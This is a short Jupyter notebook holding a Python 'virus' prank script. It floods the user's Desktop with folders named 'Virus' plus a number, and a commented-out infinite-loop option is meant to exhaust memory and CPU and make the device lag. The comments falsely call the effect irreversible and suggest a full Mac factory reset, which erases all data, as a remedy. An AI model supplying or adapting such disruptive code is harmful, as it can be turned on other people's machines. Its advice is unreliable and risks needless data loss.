{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "79363877-f1a6-4ba6-bd17-bf673823bf25",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Last Updated: 26 March 2024, 7.21PM.\n",
    "# Copyright © 2024 Gedeon Koh All rights reserved.\n",
    "# No part of this publication may be reproduced, distributed, or transmitted in any form or by any means, including photocopying, recording, or other electronic or mechanical methods, without the prior written permission of the publisher, except in the case of brief quotations embodied in reviews and certain other non-commercial uses permitted by copyright law.\n",
    "# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHOR OR COPYRIGHT HOLDER BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n",
    "# Use of this program for pranks or any malicious activities is strictly prohibited. The code generates irreversible results, for which there are currently no known solution or counter code. Any unauthorized use or dissemination of the results produced by this program is unethical and may result in legal consequences.\n",
    "# Any damage, disciplinary actions or death from this material is not the publisher's or owner's fault.\n",
    "# This code have not been tested throughly, and is still currently in the BETA stage.\n",
    "# Run and use this program this AT YOUR OWN RISK.\n",
    "# Version 0.1 BETA\n",
    "\n",
    "# This code creates blank folders\n",
    "# You can control how many folders it creates, or make the code run forever.\n",
    "# All the blank folders will eat up a lot of memory and CPU, thus making the device lag.\n",
    "\n",
    "# To stop or delete all folders, do the following:\n",
    "# (For Macbook) Go Settings, then General, then Transfer and Reset. This will reset your Mac and delete all data.\n",
    "# The above method is for desperate situations, when the choice of deleting the folders are virtually impossible due to the lag.\n",
    "# Another method is to run the Counter Code. This will not touch or delete any other data or information on your Mac, and is the safest way to delete all files.\n",
    "# If you do not have the Counter Code, you can consider deleting all the files manually by dragging them to Trash.\n",
    "\n",
    "#!pip install os\n",
    "\n",
    "import os\n",
    "\n",
    "# Windows Desktop\n",
    "# desktop = os. path. join(os.path.join(os.environ['USERPROFILE']), 'Desktop')\n",
    "\n",
    "# Macbook Desktop (OS)\n",
    "desktop = os.path.join(os.path.expanduser(\"~\"), \"Desktop\")\n",
    "\n",
    "i = 1\n",
    "\n",
    "for i in range(10):\n",
    "#for i in range(9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999):\n",
    "# while True:\n",
    "    new_folder = 'Virus'+ str(i)\n",
    "    folder_path = os.path.join(desktop, new_folder)\n",
    "    os.mkdir(folder_path)\n",
    "    # i += 1\n",
    "   \n",
    "    "
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
